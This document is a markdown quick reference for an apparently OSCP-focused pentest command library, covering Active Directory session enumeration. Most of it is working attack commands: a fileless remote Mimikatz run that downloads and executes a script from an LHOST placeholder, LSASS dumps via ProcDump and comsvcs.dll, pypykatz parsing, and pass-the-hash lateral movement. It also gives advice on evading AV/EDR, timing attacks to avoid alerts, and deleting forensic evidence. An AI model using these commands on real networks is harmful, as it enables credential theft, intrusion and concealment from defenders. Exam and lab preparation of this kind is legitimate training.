# Active Directory Session Enumeration - Quick Reference

## New Files Created

### Cheatsheets
- `/reference/data/cheatsheets/active-directory/ad-session-enumeration.json`

### Command Definitions
- `/reference/data/commands/enumeration/ad-os-enumeration.json` (6 commands)
- `/reference/data/commands/active-directory/ad-powershell-remoting.json` (8 commands)
- `/reference/data/commands/post-exploit/ad-remote-credential-theft.json` (5 commands)

**Total**: 1 cheatsheet + 19 commands

## Key Commands by Use Case

### 1. OS Version Enumeration (Target Selection)
```powershell
# Get all computer OS versions
Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion

# Filter for legacy systems (vulnerable to NetSessionEnum)
Get-NetComputer -FullData | Where-Object {
    ($_.operatingsystem -like '*Server 2012*') -or 
    ($_.operatingsystem -like '*Server 2016*')
}
```
**Commands**: `powerview-get-netcomputer-os`, `powerview-get-netcomputer-os-filter`

### 2. Session Enumeration (Legacy Systems)
```powershell
# Enumerate sessions via NetSessionEnum (works on Server 2016 and earlier)
Get-NetSession -ComputerName TARGET
```
**Commands**: `powerview-get-netsession` (already exists)

### 3. Session Enumeration (Modern Systems)
```powershell
# Check Remote Registry service status
Get-Service -ComputerName TARGET -Name RemoteRegistry

# Enable Remote Registry (if you have admin)
sc.exe \\TARGET config RemoteRegistry start= auto
sc.exe \\TARGET start RemoteRegistry

# Enumerate logged-on users via Remote Registry
PsLoggedOn.exe \\TARGET
Get-NetLoggedon -ComputerName TARGET
```
**Commands**: `check-remote-registry-service`, `enable-remote-registry`, `sysinternals-psloggedon` (already exists)

### 4. Admin Access Verification
```powershell
# Test local admin via C$ share
Test-Path \\TARGET\C$
dir \\TARGET\C$

# Authenticate with credentials
net use \\TARGET\C$ /user:DOMAIN\USERNAME PASSWORD
```
**Commands**: `test-admin-share-access`, `net-use-admin-share`, `dir-admin-share`

### 5. PowerShell Remoting
```powershell
# Test WinRM connectivity
Test-WSMan -ComputerName TARGET

# Interactive session
Enter-PSSession -ComputerName TARGET

# Non-interactive command execution
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname }
```
**Commands**: `test-wsman-connectivity`, `enter-pssession`, `invoke-command`

### 6. Remote Credential Theft
```powershell
# Remote Mimikatz (fileless)
Invoke-Command -ComputerName TARGET -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-Mimikatz.ps1')
    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
}

# LSASS dump with ProcDump (on target)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# LSASS dump with comsvcs.dll (native Windows)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full

# Parse dump on Kali
pypykatz lsa minidump lsass.dmp
```
**Commands**: `invoke-mimikatz-remote`, `procdump-lsass`, `comsvcs-lsass-dump`, `pypykatz-parse`

## Build Number Cheat Sheet

| OS | Build | NetSessionEnum | Strategy |
|----|-------|----------------|----------|
| Server 2012 R2 | 9600 | ✅ Works | Target first |
| Server 2016 | 14393 | ✅ Works | Target first |
| Win10 1607 | 14393 | ✅ Works | Target first |
| **Win10 1709** | **16299** | ❌ **BLOCKED** | Use Remote Registry |
| **Server 2019** | **17763** | ❌ **BLOCKED** | Use Remote Registry |
| Windows 11 | 22000+ | ❌ Blocked | Use Remote Registry |

**Threshold**: Build 16299 (workstations), Build 17763 (servers)

## OSCP Exam Workflow

### Phase 1: Target Identification
1. Enumerate computer OS versions
2. Filter for legacy systems (<16299 workstations, <17763 servers)
3. Build target list for session enumeration

### Phase 2: Session Discovery
1. Run Get-NetSession on legacy systems (high success rate)
2. For modern systems: Check Remote Registry service
3. Identify where Domain Admins/privileged accounts are logged in

### Phase 3: Access Verification
1. Test local admin on targets: `Test-Path \\TARGET\C$`
2. Verify WinRM availability: `Test-WSMan TARGET`
3. Document admin access paths

### Phase 4: Credential Theft
1. If WinRM available: Remote Mimikatz OR ProcDump
2. If no WinRM: Upload ProcDump, dump LSASS, transfer dump
3. Parse dump with pypykatz on Kali
4. Extract NTLM hashes and Kerberos tickets

### Phase 5: Lateral Movement
1. Test stolen credentials: `crackmapexec smb TARGET -u USER -H HASH`
2. Pass-the-hash: `evil-winrm -i TARGET -u USER -H HASH`
3. Repeat process on newly compromised systems

## Time Estimates (OSCP Exam)

- OS enumeration: 2-3 minutes
- Session enumeration (filtered targets): 2-5 minutes
- Admin access verification: 1-2 minutes per target
- LSASS dump + transfer: 3-5 minutes
- Pypykatz parsing: 1-2 minutes
- **Total**: 10-20 minutes from session discovery to credential theft

## Common Pitfalls

1. **Enumerating sessions on all systems** → Wastes time (mostly fails on modern Windows)
   - **Solution**: Filter by OS version first

2. **Mimikatz.exe upload** → Triggers AV/EDR
   - **Solution**: Use ProcDump + pypykatz OR comsvcs.dll

3. **Immediate exploitation after session discovery** → Triggers alerts
   - **Solution**: Document first, exploit during off-hours

4. **Forgetting to check Remote Registry** → Missing sessions on modern Windows
   - **Solution**: Always check service status if NetSessionEnum fails

5. **Not cleaning up dumps** → Leaves forensic evidence
   - **Solution**: Delete lsass.dmp after transfer

## Schema Compliance Notes

- All commands use placeholders: `<TARGET>`, `<LHOST>`, `<USERNAME>`, etc.
- All placeholders defined in variables array
- Alternatives/prerequisites use command IDs (not text)
- OSCP relevance: Mostly HIGH (critical for exam)
- Educational notes explain WHY techniques work

## Validation Status

- ✅ No duplicate IDs (fixed `test-wsman` → `test-wsman-connectivity`)
- ✅ All JSON files valid syntax
- ✅ Schema compliant (alternatives/prerequisites use IDs)
- ⚠️ 29 orphaned references (acceptable - references to future commands)

## Usage with crack CLI

```bash
# Search for session enumeration commands
crack reference "session enumeration"

# Get OS enumeration cheatsheet
crack reference --tag SESSION_ENUMERATION

# Interactive fill for specific command
crack reference --fill powerview-get-netcomputer-os

# Get remote credential theft commands
crack reference --category post-exploit --tag CREDENTIAL_THEFT
```

## Related Existing Content

### Cheatsheets (Already Exist)
- `ad-lateral-movement-prep.json`: General lateral movement preparation
- `ad-lateral-movement-techniques.json`: Specific lateral movement methods
- `ad-pass-the-hash-attacks.json`: Pass-the-hash techniques

### Commands (Already Exist)
- `ad-powerview-core.json`: Core PowerView commands (Get-NetSession, Find-LocalAdminAccess)
- `ad-session-share-enum.json`: Basic session/share enumeration
- `ad-lateral-movement-*.json`: Various lateral movement techniques

---

**Quick Access**: All new content in `/reference/data/` directory
**Documentation**: See `ACTIVE_DIRECTORY_SESSION_ENUMERATION_ADDITIONS.md` for full details
**Status**: Production ready, validated, schema compliant
